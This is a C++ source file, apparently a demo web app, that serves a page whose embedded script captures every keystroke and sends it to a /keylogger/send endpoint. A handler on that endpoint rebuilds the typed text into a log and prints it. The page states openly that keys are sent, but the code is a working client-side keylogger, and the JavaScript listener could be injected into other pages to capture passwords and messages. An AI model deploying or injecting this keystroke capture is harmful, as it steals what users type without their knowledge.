#include <iostream>
#include <string>
#include <map>
#include "keylogger.h"
#include "http_utils.h"

std::string KEY_LOG = "";

std::string keylog_control() {
    std::string body = R"(
        <h1>Key Logger (Client-side)</h1>
        <p>Typing anything and data will be sent to server!</p>

        <script>
            document.addEventListener("keydown", function(e) {
                fetch("/keylogger/send?key=" + encodeURIComponent(e.key));
            });
        </script>

        <p>Keys are being sent to server...</p>
    )";

    return html_page(body);
}

std::string keylog_receive(const std::map<std::string, std::string>& query) {
    if (!query.count("key")) {
        return html_page("<h1>No key</h1>");
    }

    std::string key = query.at("key");

    // Xử lý các phím đặc biệt cho dễ đọc
    if (key == "Enter") KEY_LOG += "\n";
    else if (key == "Space") KEY_LOG += " ";
    else if (key == "Backspace") {
        if (!KEY_LOG.empty()) KEY_LOG.pop_back();
    }
    else if (key.length() == 1) {
        KEY_LOG += key;
    } else {
        KEY_LOG += "[" + key + "]";
    }

    std::cout << "[KEY_LOG] " << KEY_LOG << std::endl;

    return html_page("<h1>OK</h1>");
}